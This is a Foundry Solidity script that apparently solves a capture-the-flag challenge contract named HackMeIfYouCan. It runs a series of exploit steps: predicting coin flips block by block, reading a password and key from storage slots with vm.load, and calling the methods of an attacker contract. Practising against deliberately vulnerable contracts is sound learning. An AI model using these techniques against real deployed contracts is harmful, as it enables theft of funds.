// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

// forge script script/Hack.s.sol:HackScript --rpc-url $SEPOLIA_RPC_URL -vvvv --private-key $PRIVATE_KEY --legacy

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import {Hacker} from "../src/Hacker.sol";

contract HackScript is Script {
    HackMeIfYouCan public toHack;
    Hacker public hacker;
    address public owner;

    function setUp() public {
        owner = address(this);
        bytes32[15] memory data;
        for(uint i = 0; i < 15; i++){
            data[i] = bytes32(i);
        }
        bytes32 password = bytes32(uint256(123));
        toHack = new HackMeIfYouCan(password,data);
        hacker = new Hacker(address(toHack));
        vm.deal(address(hacker),1 ether);
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        flip(); // ✅
        addPoint(); // ✅
        transfer(); // ✅
        sendPassword(); // ✅
        contribute(); // ✅
        sendKey(); // ✅
        goTo(); // ✅
        vm.stopBroadcast();
    }

    function flip() public { // ✅
        uint win = 0;
        for(uint i = 1 ; i <= 10; i ++){
            if(hacker.flip())win++;
            vm.roll(i+1); // To go next block
        }
    }

    function addPoint() public {
        hacker.addPoint();
    }

    function transfer() public { // ✅
        hacker.transfer();
    }

    function sendKey() public { // ✅
        uint startSlot = 16; // 4 + 12
        bytes32 key = vm.load(address(toHack),bytes32(startSlot));
        hacker.sendKey(bytes16(key));
    }

    function sendPassword() public { // ✅
        uint startSlot = 3;
        bytes32 password = vm.load(address(toHack),bytes32(startSlot));
        hacker.sendPassword(password);
    }

    function contribute() public { // ✅
        hacker.contribute();
    }

    function goTo() public { // ✅
        hacker.goTo(1);
    }
}
